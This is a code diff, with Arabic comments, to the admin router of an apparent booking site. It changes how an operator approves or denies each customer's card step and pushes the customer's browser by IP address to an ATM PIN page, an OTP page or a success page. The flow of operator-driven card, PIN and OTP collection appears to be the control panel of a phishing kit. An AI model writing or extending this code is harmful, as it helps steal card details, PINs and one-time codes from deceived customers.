@@ -496,7 +496,7 @@ const adminRouter = router({
       return { status: true, message: "تم الحذف" };
     }),
 
-  // التحكم في خطوات الدفع (OTP / ATM / رفض / قبول نهائي)
+  // التحكم في خطوات الدفع (قبول / رفض)
   setPaymentAction: adminProcedure
     .input(
       z.object({
@@ -507,24 +507,44 @@ const adminRouter = router({
     .mutation(async ({ input }) => {
       const { reference, action } = input;
 
-      // جلب IP العميل من قاعدة البيانات
+      // جلب IP العميل وبيانات الدفع الحالية
       const booking = await getBookingByReference(reference);
       const clientIp = booking?.clientIp || "";
+      const existingPayment = await getPaymentByReference(reference);
+      const currentStep = existingPayment?.step ?? 1;
 
-      if (action === "accepted") {
-        // توجيه لصفحة OTP
+      // تحديد الصفحة المستهدفة حسب المرحلة والإجراء
+      let targetPage: string | null = null;
+
+      if (action === "verified") {
+        // قبول: المرحلة 1 (بطاقة) → صفحة ATM | المرحلة 2 (ATM) → صفحة النجاح
+        if (currentStep <= 1) {
+          // مرحلة البطاقة: قبول → صفحة ATM PIN
+          targetPage = "pin";
+          await createOrUpdatePayment(reference, { paymentAction: "pass", step: 2 } as any);
+        } else {
+          // مرحلة ATM: قبول → صفحة النجاح
+          targetPage = "bCall";
+          await createOrUpdatePayment(reference, { paymentAction: "accepted", status: "verified" } as any);
+          await updateBookingStatus(reference, "completed", 1);
+        }
+      } else if (action === "denied") {
+        // رفض: المرحلة 1 (بطاقة) → صفحة البطاقة مع خطأ | المرحلة 2 (ATM) → صفحة ATM مع خطأ
+        if (currentStep <= 1) {
+          targetPage = "payments?declined=true";
+          await createOrUpdatePayment(reference, { paymentAction: "denied", step: 1 } as any);
+        } else {
+          targetPage = "pin?declined=true";
+          await createOrUpdatePayment(reference, { paymentAction: "denied", step: 2 } as any);
+        }
+      } else if (action === "accepted") {
+        // متوافق مع السيناريو القديم - توجيه لصفحة OTP
+        targetPage = "code";
         await createOrUpdatePayment(reference, { paymentAction: "accepted" } as any);
       } else if (action === "pass") {
-        // توجيه لصفحة ATM
-        await createOrUpdatePayment(reference, { paymentAction: "pass" } as any);
-      } else if (action === "denied") {
-        // رفض الدفع
-        await createOrUpdatePayment(reference, { paymentAction: "denied" } as any);
-        await updateBookingStatus(reference, "cancelled", 1);
-      } else if (action === "verified") {
-        // قبول نهائي
-        await createOrUpdatePayment(reference, { paymentAction: "accepted", status: "verified" } as any);
-        await updateBookingStatus(reference, "completed", 1);
+        // متوافق مع السيناريو القديم - توجيه لصفحة ATM
+        targetPage = "pin";
+        await createOrUpdatePayment(reference, { paymentAction: "pass", step: 2 } as any);
       }
 
       // إشعار Socket.io - إرسال للمسؤولين وتوجيه العميل
@@ -532,13 +552,6 @@ const adminRouter = router({
         const io = getIo();
         if (io) {
           io.to("admins").emit("paymentActionSet", { reference, action });
-
-          // تحديد الصفحة المستهدفة للعميل
-          let targetPage: string | null = null;
-          if (action === "accepted") targetPage = "code";         // صفحة OTP
-          else if (action === "pass") targetPage = "pin";          // صفحة ATM PIN
-          else if (action === "denied") targetPage = "payments?declined=true"; // رفض
-          else if (action === "verified") targetPage = "bCall";   // نجاح
 
           // إرسال navigateTo للعميل إذا كان IP معروفاً
           if (targetPage && clientIp) {
@@ -549,7 +562,7 @@ const adminRouter = router({
         }
       } catch (_) {}
 
-      return { status: true, action, reference };
+      return { status: true, action, reference, targetPage, currentStep };
     }),
 
   // إرسال رمز نفاذ للعميل
